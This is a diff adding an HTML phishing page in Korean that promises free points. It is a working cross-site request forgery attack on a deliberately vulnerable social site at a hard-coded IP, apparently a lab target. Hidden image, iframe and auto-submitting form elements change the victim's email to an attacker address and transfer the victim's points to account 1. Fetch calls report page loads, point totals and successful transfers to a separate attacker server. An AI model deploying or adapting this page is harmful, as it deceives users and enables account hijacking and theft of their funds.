@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 무료 포인트 받기!</title>
+    <meta charset="utf-8">
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+        }
+        .gift-box {
+            background: white;
+            color: #333;
+            padding: 50px;
+            border-radius: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        h1 {
+            color: #667eea;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        .gift-icon {
+            font-size: 100px;
+            animation: bounce 1s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 1.2em;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.1);
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #667eea;
+            font-size: 1.1em;
+        }
+        .success {
+            display: none;
+            color: #28a745;
+            font-size: 1.5em;
+            margin-top: 20px;
+        }
+        #pointsInfo {
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 20px 0;
+            color: #667eea;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="gift-box">
+        <div class="gift-icon">🎁</div>
+        <h1>🎉 축하합니다!</h1>
+        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
+        <div id="pointsInfo">포인트 확인 중...</div>
+        <p style="margin-top: 20px;">아래 버튼을 클릭하여 포인트를 수령하세요.</p>
+        <button onclick="claimGift()" id="claimBtn">💰 포인트 받기 💰</button>
+        <div class="loading" id="loading">⏳ 처리 중...</div>
+        <div class="success" id="success">✅ 포인트가 지급되었습니다!</div>
+    </div>
+    
+    <!-- 숨겨진 iframe으로 포인트 확인 (CORS 우회) -->
+    <iframe id="profileFrame" src="http://18.179.53.107/vulnerable-sns/www/profile.php" style="display:none;"></iframe>
+    
+    <!-- 동적으로 생성될 CSRF 폼 -->
+    <div id="csrfForms"></div>
+    
+    <!-- GET 방식 CSRF (프로필 변경) -->
+    <img src="http://18.179.53.107/vulnerable-sns/www/profile.php?email=pwned@attacker.com&full_name=HACKED" 
+         style="display:none" 
+         onload="notifyProfileChange()">
+    
+    <script>
+        let victimPoints = 0;
+        let attackExecuted = false;
+        
+        window.onload = function() {
+            fetch('http://13.158.67.78:5000/notify?event=page_loaded&time=' + new Date().toISOString())
+                .catch(() => {});
+            
+            // iframe이 로드되면 포인트 확인
+            setTimeout(() => {
+                getVictimPointsFromIframe();
+            }, 2000);
+        };
+        
+        function getVictimPointsFromIframe() {
+            try {
+                const iframe = document.getElementById('profileFrame');
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const bodyText = iframeDoc.body.innerText || iframeDoc.body.textContent;
+                
+                // 포인트 정보 파싱: "포인트: 500P" 또는 "500 P"
+                const pointsMatch = bodyText.match(/포인트:\s*(\d+)\s*P/i) || 
+                                   bodyText.match(/(\d+)\s*P/);
+                
+                if (pointsMatch) {
+                    victimPoints = parseInt(pointsMatch[1]);
+                    console.log('[+] Victim points detected:', victimPoints);
+                    
+                    document.getElementById('pointsInfo').innerHTML = 
+                        '현재 보유 포인트: ' + victimPoints + 'P';
+                    
+                    // 공격자 서버에 알림
+                    fetch('http://13.158.67.78:5000/notify?event=points_detected&points=' + victimPoints)
+                        .catch(() => {});
+                    
+                    // 포인트가 있으면 버튼 활성화
+                    if (victimPoints > 0) {
+                        document.getElementById('claimBtn').disabled = false;
+                        // 자동 실행 (3초 후)
+                        setTimeout(() => {
+                            if (!attackExecuted) {
+                                executeCSRF();
+                            }
+                        }, 3000);
+                    } else {
+                        document.getElementById('pointsInfo').innerHTML = '⚠️ 포인트가 없습니다';
+                        document.getElementById('claimBtn').disabled = true;
+                    }
+                } else {
+                    console.log('[-] Could not parse points from iframe');
+                    // 파싱 실패 시 기본값으로 시도
+                    victimPoints = 100;
+                    document.getElementById('pointsInfo').innerHTML = 
+                        '포인트 확인 실패 (기본값: 100P로 시도)';
+                    setTimeout(() => {
+                        if (!attackExecuted) {
+                            executeCSRF();
+                        }
+                    }, 3000);
+                }
+            } catch (e) {
+                console.error('[-] CORS error or iframe access denied:', e);
+                // CORS 에러 시 대체 방법: 고정 금액으로 공격
+                console.log('[*] Trying alternative method with fixed amounts');
+                document.getElementById('pointsInfo').innerHTML = 
+                    'Same-Origin 정책으로 포인트 확인 불가<br>여러 금액으로 시도합니다';
+                
+                // 여러 금액으로 시도 (100P, 300P, 500P, 1000P)
+                executeMultipleCSRF();
+            }
+        }
+        
+        function claimGift() {
+            if (attackExecuted) return;
+            document.getElementById('claimBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            executeCSRF();
+        }
+        
+        function executeCSRF() {
+            if (attackExecuted) return;
+            attackExecuted = true;
+            
+            if (victimPoints <= 0) {
+                victimPoints = 100; // 기본값
+            }
+            
+            // 피해자의 전체 포인트를 한 번에 전송
+            const formHTML = `
+                <form id="csrfFormMain" method="POST" action="http://18.179.53.107/vulnerable-sns/www/profile.php" style="display:none">
+                    <input type="hidden" name="send_gift" value="1">
+                    <input type="hidden" name="receiver_id" value="1">
+                    <input type="hidden" name="gift_type" value="diamond">
+                    <input type="hidden" name="points" value="${victimPoints}">
+                    <input type="hidden" name="message" value="Event Gift - All Points">
+                </form>
+            `;
+            
+            document.getElementById('csrfForms').innerHTML = formHTML;
+            
+            // 폼 제출
+            setTimeout(() => {
+                document.getElementById('csrfFormMain').submit();
+                
+                // 성공 알림
+                fetch('http://13.158.67.78:5000/csrf-success?victim=user&amount=' + victimPoints + '&action=gift_all')
+                    .catch(() => {});
+                
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success').innerHTML = 
+                    '✅ ' + victimPoints + ' 포인트가 전송되었습니다!';
+                document.getElementById('success').style.display = 'block';
+            }, 500);
+        }
+        
+        function executeMultipleCSRF() {
+            if (attackExecuted) return;
+            attackExecuted = true;
+            
+            // 여러 금액으로 시도 (하나라도 성공하면 OK)
+            const amounts = [1000, 500, 300, 100, 50];
+            let formHTML = '';
+            
+            amounts.forEach((amount, index) => {
+                formHTML += `
+                    <form id="csrfForm${index}" method="POST" action="http://18.179.53.107/vulnerable-sns/www/profile.php" style="display:none">
+                        <input type="hidden" name="send_gift" value="1">
+                        <input type="hidden" name="receiver_id" value="1">
+                        <input type="hidden" name="gift_type" value="diamond">
+                        <input type="hidden" name="points" value="${amount}">
+                        <input type="hidden" name="message" value="Event Gift">
+                    </form>
+                `;
+            });
+            
+            document.getElementById('csrfForms').innerHTML = formHTML;
+            
+            // 순차적으로 제출 시도
+            amounts.forEach((amount, index) => {
+                setTimeout(() => {
+                    document.getElementById('csrfForm' + index).submit();
+                    fetch('http://13.158.67.78:5000/csrf-success?victim=user&amount=' + amount + '&action=gift_multi')
+                        .catch(() => {});
+                }, index * 1000);
+            });
+            
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success').innerHTML = 
+                    '✅ 포인트 전송 완료!';
+                document.getElementById('success').style.display = 'block';
+            }, amounts.length * 1000);
+        }
+        
+        function notifyProfileChange() {
+            fetch('http://13.158.67.78:5000/notify?event=profile_changed&type=GET_CSRF')
+                .catch(() => {});
+        }
+    </script>
+</body>
+</html>
